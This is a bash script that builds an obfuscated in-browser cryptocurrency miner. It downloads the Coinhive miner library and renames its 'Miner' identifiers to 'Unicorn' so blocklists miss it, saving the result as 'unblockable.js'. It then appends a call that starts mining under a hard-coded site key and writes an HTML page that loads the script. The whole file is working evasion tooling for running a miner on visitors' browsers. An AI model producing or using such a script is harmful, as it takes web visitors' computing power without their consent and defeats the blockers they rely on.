#!/bin/bash
THROTTLE=0.5
SITE_KEY=Z892nG4sVMkhf7VsF3Z5KOlD6fpCzKqo
SCRIPT_NAME=unblockable.js

echo "Downloading coinhive.min.js..."
wget -q https://coinhive.com/lib/coinhive.min.js
echo "Generating $SCRIPT_NAME..."
sed -i 's/Miner/Unicorn/g' coinhive.min.js
mv coinhive.min.js $SCRIPT_NAME
echo "var m=new CoinHive.Anonymous('$SITE_KEY',{throttle:$THROTTLE});m.start();" >> $SCRIPT_NAME
echo -e "<p>Mining with throttle $THROTTLE for $SITE_KEY</p>\n<script src=\"$SCRIPT_NAME\"></script>" > test.html
echo "Done!"
